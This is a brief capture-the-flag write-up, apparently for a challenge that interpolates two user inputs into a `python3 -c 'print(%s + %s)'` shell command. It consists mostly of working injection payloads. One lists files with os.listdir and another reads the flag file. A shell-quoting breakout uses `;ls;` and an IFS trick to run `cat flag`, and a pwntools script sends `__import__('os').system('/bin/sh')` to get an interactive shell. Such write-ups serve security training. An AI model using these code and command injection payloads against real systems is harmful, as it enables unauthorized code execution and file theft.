```python
# vuln
python3 -c 'print(%s + %s)'
```

Firstly I’ve passed empty string [""] as the first argument and `"".join(__import__("os").listdir())` as the second one. Just to check where’s the flag.

Ok, let’s read the flag content by passing `open("flag","rt").read()` payload as a second argument.

------

Let's look around first (command: `python -c 'print()';ls;'( + ooops)'`)

Capture the flag using [IFS](https://en.wikipedia.org/wiki/Input_Field_Separators) (command: `python -c 'print()';IFS=:;a=cat:flag;$a;'( + ooops)`)

------

);1

2;print(open("./flag","r").read()

------

```python
payload_one = b'""'
payload_two = b'__import__("os").system("/bin/sh")'

p.recvuntil('Variable one: ')
p.sendline(payload_one)
p.recvuntil('Variable two: ')
p.sendline(payload_two)

p.interactive()
```

